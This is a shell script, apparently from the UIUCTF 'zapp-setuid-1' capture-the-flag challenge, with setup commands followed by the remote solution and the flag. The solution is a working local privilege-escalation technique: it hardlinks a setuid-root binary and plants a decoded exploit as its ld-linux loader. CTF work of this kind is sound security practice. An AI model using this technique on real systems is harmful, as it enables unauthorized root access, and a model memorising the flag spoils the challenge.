#!/bin/sh
# Script to be run within the VM

# Local challenge only
./init_chal zapp-setuid-1
exec setpriv --init-groups --reset-env --reuid user --regid user bash -l

##################################################################################
# solution for remote.
mkdir solution
cd solution
ln /usr/lib/zapps/build/exe exe # hardlink, which should preserve setuid and root owner
cp /usr/lib/zapps/build/lib.so .
cp /usr/lib/zapps/build/libc.so.6 .
# <MANUAL>: copy exploit.b64 from your host
# cat writeup/solution/exploit.b64 && echo
# <copy to clipboard>
# echo -n "<clipboard>" | base64 -d > exploit
# </MANUAL>
chmod ugo+x exploit
ln -s exploit ld-linux-x86-64.so.2
./exe

# uiuctf{did-you-see-why-its-in-usr-lib-now-0cd5fb56}
